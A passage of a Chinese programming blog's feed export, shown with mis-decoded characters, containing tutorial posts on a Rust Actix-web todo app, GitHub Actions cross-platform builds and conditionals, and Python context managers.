invoke__">to</span>(handlers::check_todo))</span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">items</span>(info: web::Path&lt;GetTodoList&gt;, state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">create_item</span>(</span><br><span class="line">    todo: web::Path&lt;GetTodoList&gt;,</span><br><span class="line">    info: web::Json&lt;CreateTodoItem&gt;,</span><br><span class="line">    state: web::Data&lt;AppState&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">get_item</span>(info: web::Path&lt;GetTodoItem&gt;, state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">check_todo</span>(</span><br><span class="line">    info: web::Path&lt;GetTodoItem&gt;,</span><br><span class="line">    state: web::Data&lt;AppState&gt;,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="xiao-jie">å°ç»“</span></h2><ol><li>è·å–è·¯å¾„å‚æ•°</li><li>è·å–è¯·æ±‚ä½“</li><li>è®¾ç½®æ—¥å¿—è®°å½•</li></ol><h2><span id="can-kao-wen-dang-he-xiang-mu">å‚è€ƒæ–‡æ¡£å’Œé¡¹ç›®</span></h2><ol><li><a href="https://www.youtube.com/watch?v=gQwA0g0NNSI">Creating a simple TODO service with Actix</a></li><li><a href="actix.rs">actix-web å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://github.com/actix/examples">å®˜æ–¹ actix-web ç¤ºä¾‹</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ç”¨ Rust Actix-web å†™ä¸€ä¸ª Todo åº”ç”¨ï¼ˆäºŒï¼‰â”€â”€ è¯·æ±‚è·å–å’Œæ—¥å¿—è®°å½•
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Rust" scheme="https://qiwihui.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬3å¤©ï¼šè·¨å¹³å°æ„å»º</title>
    <link href="https://qiwihui.com/qiwihui-blog-86/"/>
    <id>https://qiwihui.com/qiwihui-blog-86/</id>
    <published>2022-08-13T01:54:25.620Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub Actions çš„ä¼˜ç‚¹ä¹‹ä¸€æ˜¯å®ƒä¸ä»…æ”¯æŒåœ¨ Linux ä¸»æœºä¸Šæˆ–åœ¨å®¹å™¨ä¸­è¿è¡Œæ„å»ºã€‚GitHub å½“ç„¶æä¾›äº†Linuxè™šæ‹Ÿæœºï¼Œä½†æ˜¯å®ƒä»¬ä¹Ÿæä¾›äº†<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/virtual-environments-for-github-hosted-runners">è¿è¡Œ Windows å’Œ macOS</a> çš„è™šæ‹Ÿæœºã€‚</p><p>macOS è™šæ‹Ÿç¯å¢ƒå°¤å…¶é‡è¦ï¼Œå› ä¸ºå³ä½¿ä½œä¸ºå¼€å‘äººå‘˜ï¼Œä¹Ÿä¸èƒ½åœ¨è™šæ‹Ÿæœºä¸Šè¿è¡Œ macOSï¼Œé™¤éä½ åœ¨ Apple ç¡¬ä»¶ä¸Šè¿è¡Œå®ƒã€‚å› æ­¤ï¼Œå¦‚æœä½ è¦æ„å»ºè·¨å¹³å°åº”ç”¨ç¨‹åºï¼Œåˆ™å¯èƒ½ä¼šé™åˆ¶ä½ åœ¨æœ¬åœ°æ„å»ºå’Œæµ‹è¯•è‡ªå·±çš„åº”ç”¨ç¨‹åºçš„æ–¹å¼ã€‚</p><span id="more"></span><p>è¦æŒ‡å®šä¸»æœºç±»å‹ï¼Œè¯·ä½¿ç”¨ä½œä¸šçš„ <code>runs-on</code> å‚æ•°è¿›è¡ŒæŒ‡ç¤ºã€‚ ä¾‹å¦‚ï¼Œ<code>runs-on: macos-latest</code> å°†åœ¨ macOS ä¸Šè¿è¡Œï¼Œ<code>runs-on: windows-latest</code> å°†æ¯«ä¸å¥‡æ€ªåœ¨ Windows ä¸Šè¿è¡Œã€‚ å› æ­¤ï¼Œå¦‚æœè¦é€šè¿‡åœ¨ Linuxï¼ŒmacOS å’Œ Windows ä¸‰ä¸ªå¹³å°ä¸Šè¿è¡Œ <code>make</code> æ¥æ„å»ºåº”ç”¨ç¨‹åºï¼šï¼Œåˆ™å¯ä»¥å°†æ¯ä¸ªå¹³å°æŒ‡å®šä¸ºä¸€ä¸ªå•ç‹¬çš„ä½œä¸šã€‚ è¿™æ˜¯ä¸€ä¸ª<a href="https://gist.github.com/ethomson/54e3832bcb391edb752169b370716854">ä¾‹å­</a>ï¼š</p><script src="https://gist.github.com/ethomson/54e3832bcb391edb752169b370716854.js"></script><p>ä½†è¿™é‡å¤äº†å¾ˆå¤šâ€¦â€¦å¦‚æœä½ é˜…è¯»äº†æ˜¨å¤©æœ‰å…³ <a href="https://qiwihui.com/qiwihui-blog-85/">çŸ©é˜µå·¥ä½œæµ</a> çš„æ–‡ç« ï¼Œä½ å¯èƒ½è¿˜è®°å¾—æˆ‘è¯´è¿‡çŸ©é˜µæ‰©å±•å®é™…ä¸Šåªæ˜¯ç®€å•çš„å˜é‡æ›¿æ¢ã€‚å¥½å§ï¼Œå³ä½¿åœ¨è¿è¡Œå‚æ•°ä¸­ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><p>è¿™æ„å‘³ç€ä½ å¯ä»¥ä½¿ç”¨çŸ©é˜µæ¥å»ºç«‹è·¨å¹³å°æ„å»ºï¼Œå…¶ä¸­åªéœ€å‡ è¡Œ<a href="https://gist.github.com/ethomson/ee209ef3bad14996d43d0ccf22563bd1">å·¥ä½œæµå®šä¹‰</a>å³å¯ï¼š</p><script src="https://gist.github.com/ethomson/ee209ef3bad14996d43d0ccf22563bd1.js"></script><p>å› æ­¤ï¼Œä½ å¯ä»¥é€‰æ‹©ï¼šå¯ä»¥ä½¿ç”¨è¦åœ¨å…¶ä¸Šè¿è¡Œçš„è™šæ‹Ÿç¯å¢ƒæŒ‡å®šæ¯ä¸ªå•ç‹¬çš„ä½œä¸šï¼Œæˆ–è€…ï¼Œå¦‚æœæœ‰å…±åŒçš„æ­¥éª¤ï¼Œåˆ™å¯ä»¥ä½¿ç”¨çŸ©é˜µæ¥è¿è¡Œã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_3_crossplatform_builds.html">https://www.edwardthomson.com/blog/github_actions_3_crossplatform_builds.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬3å¤©ï¼šè·¨å¹³å°æ„å»º
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬13å¤©ï¼šæ¡ä»¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-96/"/>
    <id>https://qiwihui.com/qiwihui-blog-96/</id>
    <published>2022-08-13T01:54:25.620Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©æˆ‘ä»¬çœ‹åˆ°ï¼Œå½“ä½ è¿è¡Œå·¥ä½œæµç¨‹æ—¶ï¼Œæœ‰è®¸å¤šå¯ç”¨æ•°æ®ã€‚ä½ å¯ä»¥åœ¨runæ­¥éª¤ä¸­ä½¿ç”¨è¿™äº›æ•°æ®ï¼Œå¹¶å°†å…¶ä¸æ„å»ºè„šæœ¬ï¼Œéƒ¨ç½²æ­¥éª¤æˆ–å­˜å‚¨åº“è‡ªåŠ¨åŒ–ä¸€èµ·ä½¿ç”¨ã€‚ä½†æ˜¯ä½ ä¹Ÿå¯ä»¥åœ¨å·¥ä½œæµæœ¬èº«ä¸­ä½¿ç”¨å®ƒã€‚</p><p>åˆ©ç”¨è¿™äº›æ•°æ®çš„ä¸€ç§æœ‰ç”¨æ–¹æ³•æ˜¯<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#jobsjob_idif">æœ‰æ¡ä»¶åœ°ä½¿ç”¨å®ƒæ¥è¿è¡Œå·¥ä½œæµæ­¥éª¤</a>ã€‚</p><p>ä¾‹å¦‚ï¼Œä½ å¯èƒ½æƒ³åœ¨æ‰§è¡Œæ­¥éª¤ä¹‹å‰æ£€æŸ¥å·¥ä½œæµåœ¨å…¶ä¸­è¿è¡Œçš„å­˜å‚¨åº“çš„åç§°ã€‚å¦‚æœä½ æ­£åœ¨å¼€å‘ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œè¿™å°†å¾ˆæœ‰å¸®åŠ©â”€â”€å› ä¸ºforkä½ çš„å­˜å‚¨åº“çš„äººæ‹¥æœ‰<a href="https://qiwihui.com/qiwihui-blog-94/">å…·æœ‰ä¸åŒæƒé™çš„ä»¤ç‰Œ</a>ï¼Œå› æ­¤ä½ å¯ä»¥è·³è¿‡forkçš„å‘å¸ƒæ­¥éª¤ã€‚</p><span id="more"></span><p>è¿™ä½¿forkçš„å­˜å‚¨åº“ä»å¯ä»¥æ‰§è¡Œè¿ç»­çš„é›†æˆæ„å»ºï¼Œå¹¶ç¡®ä¿åœ¨è¿è¡Œæ„å»ºå’Œæµ‹è¯•é€šè¿‡æ—¶å·¥ä½œæµæˆåŠŸï¼Œå¹¶ä¸”ä¸ä¼šç”±äºå‘å¸ƒæ­¥éª¤ä¸Šçš„æƒé™é—®é¢˜è€Œå¤±è´¥ã€‚</p><p>ä½ å¯ä»¥è®¾ç½®ä¸€ä¸ªæ¡ä»¶ï¼Œä»¥ç¡®ä¿ä½ ä½äºæ­£ç¡®çš„å­˜å‚¨åº“ä¸Šå¹¶åœ¨CIæ„å»ºä¸­è¿è¡Œï¼ˆæ¥è‡ªpushäº‹ä»¶ï¼‰ã€‚</p><script src="https://gist.github.com/ethomson/9befd0258967e0a3006295b149792c84.js"></script><p>ç°åœ¨ï¼Œå½“æ­¤å·¥ä½œæµåœ¨forkä¸­è¿è¡Œæ—¶ï¼Œå°†è·³è¿‡â€œå‘å¸ƒæ–‡æ¡£â€æ­¥éª¤ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77768483-81418880-707d-11ea-8e35-d932d5d032cf.png" alt="image"></p><p>ä½¿ç”¨æ¡ä»¶è¯­å¥ä½¿ä½ å¯ä»¥æ„å»ºå¯åœ¨åˆ†æ”¯æˆ–åˆ†æ”¯ä¹‹é—´å…±äº«çš„é«˜çº§å·¥ä½œæµï¼Œä½†å…¶ä¸­æŸäº›æ­¥éª¤æ˜¯é’ˆå¯¹ç‰¹å®šè§¦å‘å™¨æˆ–ç¯å¢ƒé‡èº«å®šåˆ¶çš„ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_13_conditionals.html">https://www.edwardthomson.com/blog/github_actions_13_conditionals.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬13å¤©ï¼šæ¡ä»¶
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>21. ä¸Šä¸‹æ–‡ç®¡ç†å™¨ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-132/"/>
    <id>https://qiwihui.com/qiwihui-blog-132/</id>
    <published>2022-08-13T01:54:25.610Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸Šä¸‹æ–‡ç®¡ç†å™¨æ˜¯èµ„æºç®¡ç†çš„ç»ä½³å·¥å…·ã€‚ å®ƒä»¬ä½¿ä½ å¯ä»¥åœ¨éœ€è¦æ—¶ç²¾ç¡®åœ°åˆ†é…å’Œé‡Šæ”¾èµ„æºã€‚ ä¸€ä¸ªè‘—åçš„ä¾‹å­æ˜¯ <code>with open()</code> è¯­å¥ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;notes.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™å°†æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ç¡®ä¿åœ¨ç¨‹åºæ‰§è¡Œç¦»å¼€withè¯­å¥çš„ä¸Šä¸‹æ–‡ä¹‹åè‡ªåŠ¨å°†å…¶å…³é—­ã€‚ å®ƒè¿˜å¤„ç†å¼‚å¸¸ï¼Œå¹¶ç¡®ä¿å³ä½¿åœ¨å‘ç”Ÿå¼‚å¸¸çš„æƒ…å†µä¸‹ä¹Ÿèƒ½æ­£ç¡®å…³é—­æ–‡ä»¶ã€‚ åœ¨å†…éƒ¨ï¼Œä¸Šé¢çš„ä»£ç ç¿»è¯‘æˆè¿™æ ·çš„ä¸œè¥¿ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;notes.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨å’Œ <code>with</code> è¯­å¥æ›´çŸ­ï¼Œæ›´ç®€æ´ã€‚</p><span id="more"></span><h3><span id="shang-xia-wen-guan-li-qi-shi-li">ä¸Šä¸‹æ–‡ç®¡ç†å™¨ç¤ºä¾‹</span></h3><ul><li>æ‰“å¼€å’Œå…³é—­æ–‡ä»¶</li><li>æ‰“å¼€å’Œå…³é—­æ•°æ®åº“è¿æ¥</li><li>è·å–å’Œé‡Šæ”¾é”ï¼š</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line">lock = Lock()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¹æ˜“å‡ºé”™:</span></span><br><span class="line">lock.acquire()</span><br><span class="line"><span class="comment"># åšä¸€äº›æ“ä½œ</span></span><br><span class="line"><span class="comment"># é”åº”å§‹ç»ˆé‡Šæ”¾ï¼</span></span><br><span class="line">lock.release()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´å¥½ï¼š</span></span><br><span class="line"><span class="keyword">with</span> lock:</span><br><span class="line">    <span class="comment"># åšä¸€äº›æ“ä½œ</span></span><br></pre></td></tr></table></figure><h3><span id="jiang-shang-xia-wen-guan-li-qi-shi-xian-wei-lei">å°†ä¸Šä¸‹æ–‡ç®¡ç†å™¨å®ç°ä¸ºç±»</span></h3><p>ä¸ºäº†æ”¯æŒæˆ‘ä»¬è‡ªå·±çš„ç±»çš„ <code>with</code> è¯­å¥ï¼Œæˆ‘ä»¬å¿…é¡»å®ç° <code>__enter__</code> å’Œ <code>__exit__</code> æ–¹æ³•ã€‚ å½“æ‰§è¡Œè¿›å…¥ <code>with</code> è¯­å¥çš„ä¸Šä¸‹æ–‡æ—¶ï¼ŒPythonè°ƒç”¨ <code>__enter__</code>ã€‚ åœ¨è¿™é‡Œï¼Œåº”è¯¥è·å–èµ„æºå¹¶å°†å…¶è¿”å›ã€‚ å½“æ‰§è¡Œå†æ¬¡ç¦»å¼€ä¸Šä¸‹æ–‡æ—¶ï¼Œå°†è°ƒç”¨ <code>__exit__</code> å¹¶é‡Šæ”¾èµ„æºã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ManagedFile</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, filename</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;init&#x27;</span>, filename)</span><br><span class="line">        self.filename = filename</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;enter&#x27;</span>)</span><br><span class="line">        self.file = <span class="built_in">open</span>(self.filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_value, exc_traceback</span>):</span><br><span class="line">        <span class="keyword">if</span> self.file:</span><br><span class="line">            self.file.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> ManagedFile(<span class="string">&#x27;notes.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init notes.txt</span><br><span class="line">enter</span><br><span class="line">doing stuff...</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h3><span id="chu-li-yi-chang">å¤„ç†å¼‚å¸¸</span></h3><p>å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼ŒPythonå°†ç±»å‹ï¼Œå€¼å’Œå›æº¯ä¼ é€’ç»™ <code>__exit__</code> æ–¹æ³•ã€‚ å®ƒå¯ä»¥åœ¨è¿™é‡Œå¤„ç†å¼‚å¸¸ã€‚ å¦‚æœ <code>__exit__</code> æ–¹æ³•è¿”å›çš„ä¸æ˜¯ <code>True</code>ï¼Œåˆ™ <code>with</code> è¯­å¥å°†å¼•å‘å¼‚å¸¸ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ManagedFile</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, filename</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;init&#x27;</span>, filename)</span><br><span class="line">        self.filename = filename</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;enter&#x27;</span>)</span><br><span class="line">        self.file = <span class="built_in">open</span>(self.filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_value, exc_traceback</span>):</span><br><span class="line">        <span class="keyword">if</span> self.file:</span><br><span class="line">            self.file.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exc:&#x27;</span>, exc_type, exc_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ²¡æœ‰å¼‚å¸¸</span></span><br><span class="line"><span class="keyword">with</span> ManagedFile(<span class="string">&#x27;notes.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;continuing...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼‚å¸¸è§¦å‘ï¼Œä½†æ˜¯æ–‡ä»¶ä»ç„¶èƒ½è¢«å…³é—­</span></span><br><span class="line"><span class="keyword">with</span> ManagedFile(<span class="string">&#x27;notes2.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line">    f.do_something()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;continuing...&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init notes.txt</span><br><span class="line">enter</span><br><span class="line">doing stuff...</span><br><span class="line">exc: <span class="literal">None</span> <span class="literal">None</span></span><br><span class="line">exit</span><br><span class="line">continuing...</span><br><span class="line"></span><br><span class="line">init notes2.txt</span><br><span class="line">enter</span><br><span class="line">doing stuff...</span><br><span class="line">exc: &lt;<span class="keyword">class</span> <span class="string">&#x27;AttributeError&#x27;</span>&gt; <span class="string">&#x27;_io.TextIOWrapper&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;do_something&#x27;</span></span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AttributeError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">24</span>-ed1604efb530&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">     <span class="number">27</span>     <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">     <span class="number">28</span>     f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line">---&gt; <span class="number">29</span>     f.do_something()</span><br><span class="line">     <span class="number">30</span> <span class="built_in">print</span>(<span class="string">&#x27;continuing...&#x27;</span>)</span><br><span class="line">AttributeError: <span class="string">&#x27;_io.TextIOWrapper&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;do_something&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åœ¨ <code>__exit__</code> æ–¹æ³•ä¸­å¤„ç†å¼‚å¸¸å¹¶è¿”å› <code>True</code>ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ManagedFile</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, filename</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;init&#x27;</span>, filename)</span><br><span class="line">        self.filename = filename</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;enter&#x27;</span>)</span><br><span class="line">        self.file = <span class="built_in">open</span>(self.filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_value, exc_traceback</span>):</span><br><span class="line">        <span class="keyword">if</span> self.file:</span><br><span class="line">            self.file.close()</span><br><span class="line">        <span class="keyword">if</span> exc_type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Exception has been handled&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> ManagedFile(<span class="string">&#x27;notes2.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;doing stuff...&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br><span class="line">    f.do_something()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;continuing...&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init notes2.txt</span><br><span class="line">enter</span><br><span class="line">doing stuff...</span><br><span class="line">Exception has been handled</span><br><span class="line">exit</span><br><span class="line">continuing...</span><br></pre></td></tr></table></figure><h3><span id="jiang-shang-xia-wen-guan-li-qi-shi-xian-wei-sheng-cheng-qi">å°†ä¸Šä¸‹æ–‡ç®¡ç†å™¨å®ç°ä¸ºç”Ÿæˆå™¨</span></h3><p>é™¤äº†ç¼–å†™ç±»ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç¼–å†™ä¸€ä¸ªç”Ÿæˆå™¨å‡½æ•°ï¼Œå¹¶ä½¿ç”¨ <code>contextlib.contextmanager</code> è£…é¥°å™¨å¯¹å…¶è¿›è¡Œè£…é¥°ã€‚ ç„¶åï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>with</code> è¯­å¥è°ƒç”¨è¯¥å‡½æ•°ã€‚ å¯¹äºè¿™ç§æ–¹æ³•ï¼Œå‡½æ•°å¿…é¡»åœ¨ <code>try</code> è¯­å¥ä¸­ <code>yield</code> èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾èµ„æºçš„ <code>__exit__</code> æ–¹æ³•çš„æ‰€æœ‰å†…å®¹ç°åœ¨éƒ½åœ¨ç›¸åº”çš„ <code>finally</code> è¯­å¥å†…ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> contextmanager</span><br><span class="line"></span><br><span class="line"><span class="meta">@contextmanager</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_managed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">yield</span> f</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open_managed_file(<span class="string">&#x27;notes.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;some todo...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå™¨é¦–å…ˆè·å–èµ„æºã€‚ ç„¶åï¼Œå®ƒæš‚æ—¶æŒ‚èµ·å…¶è‡ªå·±çš„æ‰§è¡Œå¹¶ <em>äº§ç”Ÿ</em> èµ„æºï¼Œä»¥ä¾¿è°ƒç”¨è€…å¯ä»¥ä½¿ç”¨å®ƒã€‚ å½“è°ƒç”¨è€…ç¦»å¼€ <code>with</code> ä¸Šä¸‹æ–‡æ—¶ï¼Œç”Ÿæˆå™¨ç»§ç»­æ‰§è¡Œå¹¶é‡Šæ”¾ <code>finally</code> è¯­å¥ä¸­çš„èµ„æºã€‚</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      21. ä¸Šä¸‹æ–‡ç®¡ç†å™¨ â€” Python è¿›é˜¶
    
    </summary>
    
